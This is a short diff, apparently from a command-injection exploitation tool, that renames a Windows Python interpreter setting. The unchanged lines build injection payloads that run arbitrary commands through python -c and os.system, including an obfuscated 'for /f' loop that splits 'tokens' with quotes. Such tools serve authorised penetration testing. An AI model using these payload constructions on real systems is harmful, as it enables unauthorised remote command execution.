@@ -91,7 +91,7 @@ __Warning__: The alternative shells are still experimental.
 """
 def decision_alter_shell(separator, TAG, randv1, randv2):
   if settings.TARGET_OS == "win":
-    python_payload = settings.WIN_PYTHON_DIR + " -c \"print str(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))\""
+    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print str(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))\""
     if settings.SKIP_CALC: 
       if separator == "":
         payload = ("print(`echo " + TAG + "`." +
@@ -202,7 +202,7 @@ def cmd_execution_alter_shell(separator, TAG, cmd):
                 )
     else:
       python_payload = ("for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " + 
-                        settings.WIN_PYTHON_DIR + " -c \"import os; os.system('" + cmd + "')\"" + 
+                        settings.WIN_PYTHON_INTERPRETER + " -c \"import os; os.system('" + cmd + "')\"" + 
                         "') do @set /p =%i < nul"
                        )
 
